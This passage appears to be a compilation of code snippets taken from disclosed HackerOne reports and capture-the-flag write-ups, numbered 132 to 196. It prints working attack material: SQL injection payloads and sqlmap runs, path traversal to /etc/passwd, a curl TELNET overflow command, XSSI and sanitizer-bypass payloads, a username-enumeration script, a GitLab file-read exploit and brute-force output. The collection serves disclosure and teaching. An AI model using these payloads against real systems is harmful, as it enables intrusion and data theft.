-tNEW_ENV=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa -tNEW_ENV=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa -tNEW_ENV=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa telnet://127.0.0.1 <<< foo
# … truncated …
```

## 132. [#1553301](https://hackerone.com/reports/1553301)  -  CVE-2022-27779: cookie for trailing dot TLD
*medium*

```bash
curl -c cookies.txt http://localtest.me./index.php
```

## 133. [#1553301](https://hackerone.com/reports/1553301)  -  CVE-2022-27779: cookie for trailing dot TLD
*medium*

```bash
curl -b cookies.txt http://domain.me./index.php
```

## 134. [#453820](https://hackerone.com/reports/453820)  -  [harp] File access even when they have been set to be ignored.
*medium*

```bash
curl --path-as-is 0.0.0.0:9000/_secret.txt
...
<h1>404</h1><h2>Page Not Found</h2>
...
```

## 135. [#453820](https://hackerone.com/reports/453820)  -  [harp] File access even when they have been set to be ignored.
*medium*

```bash
curl --path-as-is 0.0.0.0:9000/%5fsecret.txt  
secret text
```

## 136. [#407319](https://hackerone.com/reports/407319)  -  ActiveStorage service's signed URLs can be hijacked via AppCache+Cookie stuffing trick when using GCS or DiskService
*high*

```html
<script>
  alert('Your request to the page '+location.href+' is hijacked!');
</script>
```

## 137. [#1069335](https://hackerone.com/reports/1069335)  -  How The Hackers Saved Christmas
*critical*

```bash
> sqlmap -u "https://hackyholidays.h1ctf.com/evil-quiz" \
    --data="name=nytr0gen" \
    --cookie="session=25677e0c322966d2d4cc71b2c3e49e86" \
    --drop-set-cookie --ignore-redirects \
    -p name --dbms=mysql --prefix="'" \
    --technique=B \
    --second-url="https://hackyholidays.h1ctf.com/evil-quiz/score" \
    --string="is 1 other" \
    --proxy="http://localhost:8080/" \
    --save=$PWD/quiz.conf

        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.12#stable}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

sqlmap identified the following injection point(s) with a total of 16 HTTP(s) requests:
---
Parameter: name (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: name=nytr0gen' AND 5126=5126 AND 'JwkO'='JwkO
---
back-end DBMS: MySQL >= 8.0.0
```

## 138. [#1069175](https://hackerone.com/reports/1069175)  -  h1-ctf : 12 days of hack holiday writeup
*critical*

```
select table_name from information_schema.tables order by create_time desc limit 0,1;
```

## 139. [#894110](https://hackerone.com/reports/894110)  -  h1-ctf writeup , finally paid the payments by chaining multiple bugs
*critical*

```
It just checks there is start param in query on deep link and that param value == PartTwoActivity
Solution :
```

## 140. [#894110](https://hackerone.com/reports/894110)  -  h1-ctf writeup , finally paid the payments by chaining multiple bugs
*critical*

```
After few trails over that request , found it resonds to POST method , which takes staff_id as input.
If already knows staff_id from GET method is used it is responding as `Staff Member already has an account`
For non existing staff_id's `Invalid Staff ID`

This is most difficult part i faced, didn't expected the recon concept, wasted days over this : (, but i liked it , it is relevant to real life scenario.  
We need a new joining staff_id to create an account.
**Recon part**
Gone to twitter https://twitter.com/BountypayHQ
There is a tweet : `Today we welcome Sandra to the team!!!` it is hint for us.
Searched for following of BountypayHQ in twitter and find sandra twitter account https://twitter.com/SandraA76708114
There she posts a tweet of first day job https://twitter.com/SandraA76708114/status/1258693001964068864.
Where the photo contains the ID card which has an staff_id on it F859634.

**Staff id**: STF:8FJ3KFISL3
with which we can create new account to get staff credentials.
```

## 141. [#1068434](https://hackerone.com/reports/1068434)  -  HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags
*critical*

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20ALL%20SELECT%201,%27BLAH%27,group_concat(concat(table_name,%27:%27,column_name))%20from%20information_schema.columns%20WHERE%20table_schema=%27recon%27;/*
```

## 142. [#1069171](https://hackerone.com/reports/1069171)  -  [H1 hackyholidays] CTF Writeup
*critical*

```sql
select * from photo
where album_id='' and 1=0 union select 1,2,'our_path' --
```

## 143. [#1069171](https://hackerone.com/reports/1069171)  -  [H1 hackyholidays] CTF Writeup
*critical*

```sql
' and 1=0 union select 0x2720616e6420313d3020756e696f6e2073656c65637420312c322c276f75725f7061746827202d2d20,2,3 --
```

## 144. [#689997](https://hackerone.com/reports/689997)  -  Disclosure of Email title report in quick award paypout email (no content mode)
*low, $500*

```bash
curl "https://api.hackerone.com/v1/programs/42738/bounties" \
  -X POST \
  -u "dummy:xxxxxxxx" \
  -H "Content-Type: application/json" \
  -d @- <<EOD
    {
      "data": {
        "type": "bounty",
        "attributes": {
          "amount": 100,
          "reference": "aaaaa",
          "title": "SQL injection in example.com",
          "recipient": "example@example.com",
          "currency": "USD",
          "severity_rating": "high"
        }
      }
    }
EOD
```

## 145. [#1223882](https://hackerone.com/reports/1223882)  -  CVE-2021-22925: TELNET stack contents disclosure again
*low*

```bash
$ curl telnet://127.0.0.1:23 -t NEW_ENV=`python -c "print('a,' + 'b'*256)"`
```

## 146. [#495525](https://hackerone.com/reports/495525)  -  XSSI: Quick Navigation Interface - leak of private page/post titles
*medium, $50*

```html
<script src="http://192.168.0.104/wordpress5/wordpress/wp-admin/admin-ajax.php?action=qni_content_index"></script>
```

## 147. [#495525](https://hackerone.com/reports/495525)  -  XSSI: Quick Navigation Interface - leak of private page/post titles
*medium, $50*

```html
<script>
    console.log(window.qniContentIndex); // in a real-world attack, this would be send to the attacker's server
    </script>
```

## 148. [#361951](https://hackerone.com/reports/361951)  -  Exploiting JSONP callback on /username/charts.json endpoint leads to information disclosure despite user's privacy settings
*medium*

```html
<script>
function rip(a) {

alert(JSON.stringify(a[1]));

}
</script>
```

## 149. [#407319](https://hackerone.com/reports/407319)  -  ActiveStorage service's signed URLs can be hijacked via AppCache+Cookie stuffing trick when using GCS or DiskService
*high*

```html
<html>
<script>
  alert('Your request to the page '+location.href+' is hijacked!');
</script>
</html>
```

## 150. [#850447](https://hackerone.com/reports/850447)  -  gitlab-workhorse bypass in Gitlab::Middleware::Multipart allowing files in `allowed_paths` to be read
*critical, $10,000*

```
../../../../../opt/gitlab/embedded/service/gitlab-rails/public/422.html
```

## 151. [#1069335](https://hackerone.com/reports/1069335)  -  How The Hackers Saved Christmas
*critical*

```json
{{template:..}}
```

## 152. [#1069335](https://hackerone.com/reports/1069335)  -  How The Hackers Saved Christmas
*critical*

```json
{{template:**cbdj3_grinch_header.html**}}
```

## 153. [#1069335](https://hackerone.com/reports/1069335)  -  How The Hackers Saved Christmas
*critical*

```json
{{template:**cbdj3_grinch_footer.html**}}
```

## 154. [#1069335](https://hackerone.com/reports/1069335)  -  How The Hackers Saved Christmas
*critical*

```json
{{template:**38dhs_admins_only_header.html**}}
```

## 155. [#1069335](https://hackerone.com/reports/1069335)  -  How The Hackers Saved Christmas
*critical*

```json
{{template:**./cbdj3_grinch_header.html**}}
```

## 156. [#1069335](https://hackerone.com/reports/1069335)  -  How The Hackers Saved Christmas
*critical*

```json
{{name}}
```

## 157. [#1069175](https://hackerone.com/reports/1069175)  -  h1-ctf : 12 days of hack holiday writeup
*critical*

```json
{{template:cbdj3_grinch_header.html}}
```

## 158. [#1069175](https://hackerone.com/reports/1069175)  -  h1-ctf : 12 days of hack holiday writeup
*critical*

```json
{{template:cbdj3_grinch_footer.html}}
```

## 159. [#1069175](https://hackerone.com/reports/1069175)  -  h1-ctf : 12 days of hack holiday writeup
*critical*

```json
{{template:<TEMPLATE NAME>}}
```

## 160. [#1069175](https://hackerone.com/reports/1069175)  -  h1-ctf : 12 days of hack holiday writeup
*critical*

```json
{{template:38dhs_admins_only_header.html}}
```

## 161. [#1069175](https://hackerone.com/reports/1069175)  -  h1-ctf : 12 days of hack holiday writeup
*critical*

```json
{{webhak}}
```

## 162. [#1068434](https://hackerone.com/reports/1068434)  -  HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags
*critical*

```bash
$ curl https://hackyholidays.h1ctf.com/swag-shop/api/sessions | jq -r '.sessions[]' | base64 -d | jq

{
  "user": null,
  "cookie": "YzVmNTJiYTNkOWFlYTY2YjA1ZTY1NDBlNmI0YmZjMmNmZGYzMzg1MWJkZDcyMzY0ZTFlYjdmNDY3NDkzNzIwMGNiZjNhMjQ3Y2RmY2E2N2FmMzdjM2I0ZWNlZTVkM2VkNzU3MTUwYjdkYzkyNWI4Y2I3ZWZiNjk2N2NjOTk0MjU="
}
{
  "user": null,
  "cookie": "ZjM2MzNjM2JkZGUyMzVmMmY2ZjcxNjdlNDNmZjQwZTlmY2RhNjYxNWM5Y2Y1ZjY2ODU3NjkxMTQ2Nzk0ZmIxOWZhN2ZhZjg0Y2E5Nzk1NTQ2MzMzZTc0MWJlMzVhZDA0MDUwYmQ3NDlmZTE4MmNkMjMxMzU0MWRlMTJhNWYzOGQ="
}
{
  "user": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
  "cookie": "NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="
}
{
  "user": null,
  "cookie": "MDRmYTBhN2FiNjY5MGFlOWFmYTE4ZjE2N2JjZmYzZWJkOTRlOGYwMjI1OGIyNjM1ODU0Njc2YTdlZTM4MzFiM2I1MTUzMzViMjFhYzVkMTc4ODE3OGM4Y2JlOTk4MjJlMDI2YjQzZDQxMGNmNTg1ODQxZjBmODBmZWQxZmE1YmE="
}
{
  "user": null,
  "cookie": "M2Q2MDIzNDg5MWE0N2M3NDJmNTIyNGM3NWUxYWQ0NDRlZWI3MTg4MjI3ZGRkMTllZTM2ZDkxMGVlNWEwNmZiZWFkZjZhODg4MDY3ODlmZGRhYTM1Y2IyMGVhMjA1NjdiNDFjYzBhMWQ4NDU1MDc4NDE1YmI5YTJjODBkMjFmN2Y="
}
{
  "user": null,
  "cookie": "MWY3MTAzMTBjZGY4ZGMwYjI3Zjk2ZmYzMWJlMWEyZTg1YzE0MmZlZjMwYmJjZmQ4ZTU0Y2YxYzVmZTM1N2Q1ODY2YjFkZmFiNmI5ZjI1M2M2MDViNjA0ZjFjNDVkNTQ4N2U2ODdiNTJlMmFiMTExODA4MjU2MzkxZWNhNjFkNmU="
}
{
  "user": null,
  "cookie": "MDM4YzhiN2Q3MmY0YjU2M2FkZmFlNDMwMTI5MjEyODhlNGFkMmI5OTcyMDlkNTJhZTc4YjUxZjIzN2Q4NmRjNjg2NmU1MzVlOWEzOTE5NWYyOTcwNmJlZDIyNDgyMTA5ZDA1OTliMTYyNDczNjFkZmU0MTgxYWEwMDU1ZWNhNzQ="
}
{
  "user": null,
  "cookie": "OGI3N2ExOGVjNzM1ZWVmNTk2ZjNkZjIwM2ZjYzdjMWNhODg4NDhhODRmNjI0NDRjZTdlZTg0ZTUwNzZmZDdkYTJjN2IyODY5YjcxZmI5ZGRiYTgzZjhiZDViOWZjMTVlZDgzMTBkNzNmODI0OTM5ZDM3Y2JjZmY4NzEyOGE3NTM="
}
# … truncated …
```

## 163. [#1068434](https://hackerone.com/reports/1068434)  -  HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags
*critical*

```
../../../../../../../etc/passwd`
```

## 164. [#1069171](https://hackerone.com/reports/1069171)  -  [H1 hackyholidays] CTF Writeup
*critical*

```json
{{template:<file-name>}}
```

## 165. [#1069171](https://hackerone.com/reports/1069171)  -  [H1 hackyholidays] CTF Writeup
*critical*

```json
{{template:}}
```

## 166. [#1069171](https://hackerone.com/reports/1069171)  -  [H1 hackyholidays] CTF Writeup
*critical*

```json
{{payload}}
```

## 167. [#848625](https://hackerone.com/reports/848625)  -  None permission staff member can identify installed application and products attached to it
*low, $500*

```html
<script id="__st">var __st={"a":2616790000,"offset":-14400,"reqid":"fff-bbb-ccc-bbb-qqq","pageurl":"test-myshopify.com\/products\/tt","u":"184d9400000a","p":"product","rtyp":"product","rid":3785077260000};</script>
```

## 168. [#2737309](https://hackerone.com/reports/2737309)  -  Information disclosure on password cancel endpoint
*low*

```html
<script>history.pushState('', '', '/')</script>
```

## 169. [#806151](https://hackerone.com/reports/806151)  -  Enumeration of username on password reset page
*low*

```
const fetch = require('node-fetch');
let usernames = [
  'codermak',
  'codermmak',
  'codermak2',
  'codermak222'
];
let validUsernames = [];

const request = async (input) => {
  const res = await fetch("https://da.theendlessweb.com:2222/CMD_LOST_PASSWORD", {
    "credentials": "include",
    "headers": {
      "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:73.0) Gecko/20100101 Firefox/73.0",
      "Accept": "*/*",
      "Accept-Language": "en-US,en;q=0.5",
      "Content-Type": "application/x-www-form-urlencoded"
    },
    "referrer": "https://da.theendlessweb.com:2222/lost-password?username=codermak2&code=test",
    "body": `action=code&username=${input}&code=test&json=yes`,
    "method": "POST",
    "mode": "cors"
  });

  const text = await res.text();
  try {
    const result = JSON.parse(text);
    const errMessage = result.error;
    if (errMessage === 'No such username in the request list.  Your request may have expired.') {
      validUsernames.push(input);
    }
  } catch (err) {

  }
};


const main = async () => {
  for (const username of usernames) {
    await request(username);
# … truncated …
```

## 170. [#3443563](https://hackerone.com/reports/3443563)  -  Roundcube Webmail Style Sanitizer can be bypassed using CSS Character Escapes
*medium*

```html
<div style='content: "\0026quot;; background: url(//http.cat/418); content:""; width: 100%; height: 100%;'>hi, this shouldn't work :(</div>
```

## 171. [#2580062](https://hackerone.com/reports/2580062)  -  NoSQL injection leaks visitor token and livechat messages
*medium*

```javascript
Meteor.methods<ServerMethods>({
  async 'livechat:loginByToken'(token) {
    methodDeprecationLogger.method('livechat:loginByToken', '7.0.0');
    const visitor = await LivechatVisitors.getVisitorByToken(token, { projection: { _id: 1 } });

    if (!visitor) {
      return;
    }

    return {
      _id: visitor._id,
    };
  },
});
```

## 172. [#2580062](https://hackerone.com/reports/2580062)  -  NoSQL injection leaks visitor token and livechat messages
*medium*

```javascript
Meteor.methods<ServerMethods>({
  async 'livechat:loadHistory'({ token, rid, end, limit = 20, ls }) {
    methodDeprecationLogger.method('livechat:loadHistory', '7.0.0');

    if (!token || typeof token !== 'string') {
      return;
    }

    const visitor = await LivechatVisitors.getVisitorByToken(token, { projection: { _id: 1 } });

    if (!visitor) {
      throw new Meteor.Error('invalid-visitor', 'Invalid Visitor', {
        method: 'livechat:loadHistory',
      });
    }

    const room = await LivechatRooms.findOneByIdAndVisitorToken(rid, token, { projection: { _id: 1 } });
    if (!room) {
      throw new Meteor.Error('invalid-room', 'Invalid Room', { method: 'livechat:loadHistory' });
    }

    return loadMessageHistory({ userId: visitor._id, rid, end, limit, ls });
  },
});
```

## 173. [#623588](https://hackerone.com/reports/623588)  -  Uninitialized read in gdImageCreateFromXbm
*medium*

```c
...
unsigned int b;
...
sscanf(h, "%x", &b);
		for (bit = 1; bit <= max_bit; bit = bit << 1) {
			gdImageSetPixel(im, x++, y, (b & bit) ? 1 : 0);
...
```

## 174. [#432600](https://hackerone.com/reports/432600)  -  [static-resource-server]  Path Traversal allows to read content of arbitrary file on the server
*high*

```
../../../../etc/passwd
```

## 175. [#850447](https://hackerone.com/reports/850447)  -  gitlab-workhorse bypass in Gitlab::Middleware::Multipart allowing files in `allowed_paths` to be read
*critical, $10,000*

```bash
# create test file on gitlab server
echo hello > /tmp/ggg; sudo chown git:git /tmp/ggg

# attacker
curl -XPUT -v -F '[package]=@/tmp/lala.txt' "http://vakzz:$TOKEN@gitlab-vm.local/api/v4/projects/171/packages/nuget/?package.path=/tmp/ggg"

{"message":"201 Created"}
```

## 176. [#850447](https://hackerone.com/reports/850447)  -  gitlab-workhorse bypass in Gitlab::Middleware::Multipart allowing files in `allowed_paths` to be read
*critical, $10,000*

```bash
echo hello > /tmp/ggg; sudo chown root:root /tmp/ggg

$ curl -g -XPOST -v -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/tmp/ggg' -F '[file]=@/tmp/lala.txt'

{"file_name":"ggg","file_path":"uploads/58ec1627b3f14eba0a16659fd859da63/ggg","branch":"master","link":{"url":"uploads/58ec1627b3f14eba0a16659fd859da63/ggg","markdown":"[ggg](uploads/58ec1627b3f14eba0a16659fd859da63/ggg)"}}
```

## 177. [#1069335](https://hackerone.com/reports/1069335)  -  How The Hackers Saved Christmas
*critical*

```js
> curl 'https://hackyholidays.h1ctf.com/swag-shop/api/sessions' | jq
{
  "sessions": [
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=",
    "eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0="
  ]
}
# … truncated …
```

## 178. [#1069335](https://hackerone.com/reports/1069335)  -  How The Hackers Saved Christmas
*critical*

```bash
> curl 'https://hackyholidays.h1ctf.com/swag-shop/api/user' | jq
{
  "error": "Missing required fields"
}
```

## 179. [#1069335](https://hackerone.com/reports/1069335)  -  How The Hackers Saved Christmas
*critical*

```bash
> cd ~/tools/Arjun
> python3 arjun.py -u 'https://hackyholidays.h1ctf.com/swag-shop/api/user'
    _
   /_| _
  (  |/ /(//) v2.0-beta
      _/

[*] Probing the target for stability
[*] Analysing HTTP response for anomalies
[*] Analysing HTTP response for potential parameter names
[*] Logicforcing the URL endpoint
[✓] name: uuid, factor: http code
```

## 180. [#1069335](https://hackerone.com/reports/1069335)  -  How The Hackers Saved Christmas
*critical*

```bash
> curl 'https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043' | jq
{
  "uuid": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
  "username": "grinch",
  "address": {
    "line_1": "The Grinch",
    "line_2": "The Cave",
    "line_3": "Mount Crumpit",
    "line_4": "Whoville"
  },
  "flag": "flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"
}
```

## 181. [#1069335](https://hackerone.com/reports/1069335)  -  How The Hackers Saved Christmas
*critical*

```php
<?php
if (isset($_GET["template"])) {
    $page = $_GET["template"];
    // remove non allowed characters
    $page = preg_replace("/([^a-zA-Z0-9.])/", "", $page);
    // protect admin.php from being read
    $page = str_replace("admin.php", "", $page);
    // I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php", "", $page);

    if (file_exists($page)) {
        echo file_get_contents($page);
    } else { // redirect to home
        header("Location: /my-diary/?template=entries.html");
    }
}
```

## 182. [#1069335](https://hackerone.com/reports/1069335)  -  How The Hackers Saved Christmas
*critical*

```
> wget 'https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip'
Connecting to hackyholidays.h1ctf.com (hackyholidays.h1ctf.com)|18.216.153.32|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4118 (4.0K) [application/zip]
Saving to: 'signupmanager.zip'

> unzip signupmanager.zip
Archive:  signupmanager.zip
  inflating: README.md
  inflating: admin.php
  inflating: index.php
  inflating: signup.php
  inflating: user.php
```

## 183. [#1069335](https://hackerone.com/reports/1069335)  -  How The Hackers Saved Christmas
*critical*

```bash
> python brute_dirs.py
/api/ping - Invalid content type detected
/api/user - Invalid content type detected
```

## 184. [#1069335](https://hackerone.com/reports/1069335)  -  How The Hackers Saved Christmas
*critical*

```bash
> python brute_params.py
/api/user?username=test - Expected HTTP status 200, Received: 204
/api/user?password=test - Expected HTTP status 200, Received: 204
```

## 185. [#1069335](https://hackerone.com/reports/1069335)  -  How The Hackers Saved Christmas
*critical*

```bash
> python brute_credentials.py username
g
gr
gri
grin
grinc
grinch
grincha
grinchad
grinchadm
grinchadmi
grinchadmin

> python brute_credentials.py password
s
s4
s4n
s4nt
s4nt4
s4nt4s
s4nt4su
s4nt4suc
s4nt4suck
s4nt4sucks
```

## 186. [#1735586](https://hackerone.com/reports/1735586)  -  Wordpress users Disclosure [ /wp-json/wp/v2/users/ ]
*critical*

```javascript
add_filter( 'rest_endpoints', function( $endpoints ){
    if ( isset( $endpoints['/wp/v2/users'] ) ) {
        unset( $endpoints['/wp/v2/users'] );
    }
    if ( isset( $endpoints['/wp/v2/users/(?P<id>[\d]+)'] ) ) {
        unset( $endpoints['/wp/v2/users/(?P<id>[\d]+)'] );
    }
    return $endpoints;
});
```

## 187. [#1069175](https://hackerone.com/reports/1069175)  -  h1-ctf : 12 days of hack holiday writeup
*critical*

```
<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```

## 188. [#1069175](https://hackerone.com/reports/1069175)  -  h1-ctf : 12 days of hack holiday writeup
*critical*

```json
{{template:cbdj3_grinch_header.html}} Hi {{name}}..... Guess what..... <strong>YOU SUCK!</strong>{{template:cbdj3_grinch_footer.html}}
```

## 189. [#1069175](https://hackerone.com/reports/1069175)  -  h1-ctf : 12 days of hack holiday writeup
*critical*

```
Hello {{template:38dhs_admins_only_header.html}}
```

## 190. [#1069175](https://hackerone.com/reports/1069175)  -  h1-ctf : 12 days of hack holiday writeup
*critical*

```
preview_markup=Hello {{template:38dhs_admins_only_header.html}} &preview_data={"name":"Alice","email":"alice@test.com"}
```

## 191. [#1069175](https://hackerone.com/reports/1069175)  -  h1-ctf : 12 days of hack holiday writeup
*critical*

```
preview_markup=Hello , {{webhak}} &preview_data={"name":"Alice", "webhak":"{{template:38dhs_admins_only_header.html}}" }
```

## 192. [#1069175](https://hackerone.com/reports/1069175)  -  h1-ctf : 12 days of hack holiday writeup
*critical*

```
# SignUp Manager

SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.

### How to Install

1) Create a directory that you wish SignUp Manager to be installed into

2) Move signupmanager.zip into the new directory and unzip it.

3) For security move users.txt into a directory that cannot be read from website visitors

4) Update index.php with the location of your users.txt file

5) Edit the user and admin php files to display your hidden content

6) You can make anyone an admin by changing the last character in the users.txt file to a Y
7b) Default login is admin / password
```

## 193. [#1069175](https://hackerone.com/reports/1069175)  -  h1-ctf : 12 days of hack holiday writeup
*critical*

```python
import requests
import sys
from bs4 import BeautifulSoup
import base64

if len(sys.argv) != 2:
    print("(-) Usage: {} <PATH>".format(sys.argv[0]))
    sys.exit(1)

url ="https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=a' UNION SELECT \"2' UNION SELECT 1,1,'{}' --+-\",1,1--+-".format(sys.argv[1])
response = requests.get(url) 
soup = BeautifulSoup(response.text, 'html.parser')
all_img = soup.find_all(class_="img-responsive")
interesting_image_src = all_img[1]['src']

data_content = base64.b64decode(interesting_image_src.split("?")[1].split("data")[1]).decode("utf-8")

image_url = "https://hackyholidays.h1ctf.com{}".format(interesting_image_src)
image_resp = requests.get(image_url)

print("{} - {} - {}".format(image_resp.status_code, data_content, image_resp.text))
```

## 194. [#894110](https://hackerone.com/reports/894110)  -  h1-ctf writeup , finally paid the payments by chaining multiple bugs
*critical*

```json
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = https://github.com/bounty-pay-code/request-logger.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
```

## 195. [#894110](https://hackerone.com/reports/894110)  -  h1-ctf writeup , finally paid the payments by chaining multiple bugs
*critical*

```
After that there is question where it ask for header value and combine it with `X-` and checks with header value of firebase.
From internal files of firebase in apk found the url for firebase https://bountypay-90f64.firebaseio.com/
Then getting the header value in it, https://bountypay-90f64.firebaseio.com/header/.json  `Token` is the value, submit it

## Third Challenge
Where as PartThreeActivity it checks for `three=base64(PartThreeActivity)` and `switch=base64(on)` and `header=X-Token`
Solution :
```

## 196. [#1068434](https://hackerone.com/reports/1068434)  -  HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags
*critical*

```python
#!/usr/bin/env python3
import requests

url='https://hackyholidays.h1ctf.com/evil-quiz'
cookies={'session': '4fbc0cc824c9ee373d677e1840288aaf'}
